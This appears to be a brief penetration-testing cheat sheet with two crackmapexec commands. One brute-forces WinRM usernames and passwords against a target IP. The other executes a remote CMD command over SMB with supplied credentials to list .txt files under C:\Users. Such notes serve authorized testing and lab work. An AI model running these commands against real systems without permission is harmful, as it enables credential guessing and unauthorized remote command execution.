# WinRM
## Brute force users and passwords
```sh
crackmapexec winrm <ip> -u [username_or_file] -p [password_or_file]
```

# SMB
## Execute CMD commands
```sh
crackmapexec smb -u [user] -p [password] -x 'dir "C:\Users\*.txt" /s' [ip]
```
